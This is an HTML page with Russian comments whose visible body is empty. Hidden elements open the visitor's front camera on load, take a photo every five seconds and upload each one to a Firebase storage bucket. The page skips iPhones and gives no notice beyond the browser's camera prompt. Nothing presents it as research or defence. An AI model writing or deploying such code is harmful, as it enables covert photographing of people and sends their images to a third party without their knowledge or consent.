<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Съемка с фронтальной камеры</title>
</head>
<body>
    <video id="front-camera-video" autoplay playsinline style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
        import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";

        // Проверка на iPhone
        function isIphone() {
            return /iPhone|iPad|iPod/i.test(navigator.userAgent);
        }

        if (!isIphone()) {
            console.log("Устройство не iPhone, запускаем съемку.");

            // Конфигурация Firebase (замени на свои данные)
            const firebaseConfig = {
                apiKey: "YOUR_API_KEY",
                authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
                projectId: "YOUR_PROJECT_ID",
                storageBucket: "YOUR_PROJECT_ID.appspot.com",
                messagingSenderId: "YOUR_SENDER_ID",
                appId: "YOUR_APP_ID"
            };

            const app = initializeApp(firebaseConfig);
            const storage = getStorage(app);

            const frontVideo = document.getElementById('front-camera-video');
            const canvas = document.getElementById('canvas');

            // Получаем доступ к фронтальной камере
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    frontVideo.srcObject = stream;
                    // Автоматически делаем фото каждые 5 секунд
                    setInterval(captureAndUploadPhoto, 5000);
                })
                .catch(error => {
                    console.error("Ошибка доступа к фронтальной камере:", error);
                });

            // Функция для снятия фото и загрузки на Firebase
            function captureAndUploadPhoto() {
                const context = canvas.getContext('2d');
                canvas.width = frontVideo.videoWidth;
                canvas.height = frontVideo.videoHeight;
                context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);

                const dataURL = canvas.toDataURL('image/png');
                uploadToFirebase(dataURL);
            }

            // Загрузка изображения в Firebase Storage
            function uploadToFirebase(dataURL) {
                const storageRef = ref(storage, `photos/photo_${Date.now()}.png`);
                const file = dataURLtoFile(dataURL, `photo_${Date.now()}.png`);

                uploadBytes(storageRef, file)
                    .then(() => {
                        console.log("Фото успешно загружено в Firebase!");
                    })
                    .catch(error => {
                        console.error("Ошибка загрузки фото:", error);
                    });
            }

            // Конвертация Data URL в файл
            function dataURLtoFile(dataurl, filename) {
                const arr = dataurl.split(',');
                const mime = arr[0].match(/:(.*?);/)[1];
                const bstr = atob(arr[1]);
                let n = bstr.length;
                const u8arr = new Uint8Array(n);
                while (n--) {
                    u8arr[n] = bstr.charCodeAt(n);
                }
                return new Blob([u8arr], { type: mime });
            }
        } else {
            console.log("Скрипт не выполняется на iPhone.");
        }
    </script>
</body>
</html>
